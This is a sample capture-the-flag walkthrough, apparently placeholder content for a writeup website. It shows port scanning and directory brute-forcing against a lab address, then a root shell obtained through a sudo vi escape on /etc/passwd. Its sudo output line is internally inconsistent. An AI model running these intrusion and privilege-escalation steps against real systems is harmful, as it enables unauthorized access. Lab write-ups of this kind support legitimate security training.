---
title: Sample Writeup
date: 2026-01-01
category: Web
platform: Sample Platform
difficulty: 1
tags: [sample, web, demonstration]
summary: This is a sample writeup to demonstrate the format and features
sample: true
---

# Sample Writeup

This is a sample writeup to demonstrate the format and features of the writeup system.

## Summary

This sample shows how a writeup renders: title, metadata, difficulty bars, reading time, code highlighting, and copy buttons on code blocks.

## Recon

First, I ran a port scan to identify open services:

```bash
nmap -sV -p- 10.10.10.10 -T4
```

I found ports 80 and 443 open, running Apache.

## Foothold

I discovered a hidden directory using directory brute-forcing:

```bash
gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```

This revealed `/admin` which contained a vulnerable login page.

## Privilege Escalation

After gaining initial access, I found a misconfigured sudo permission:

```bash
sudo -l
# (not root) NOPASSWD: /usr/bin/vi
```

I exploited this to gain root access:

```bash
sudo vi /etc/passwd
:!bash
```

## Flags

- user: FLAG{redacted_sample_user_flag}
- root: FLAG{redacted_sample_root_flag}

## What I Learned

- Always check for hidden directories with gobuster/ffuf
- Sudo misconfigurations can lead to privilege escalation
- The `vi` editor can be used to spawn a shell with `!` commands

## Tools Used

- nmap - Network scanning
- gobuster - Directory brute-forcing
- Burp Suite - Web vulnerability scanning
- linpeas - Linux enumeration
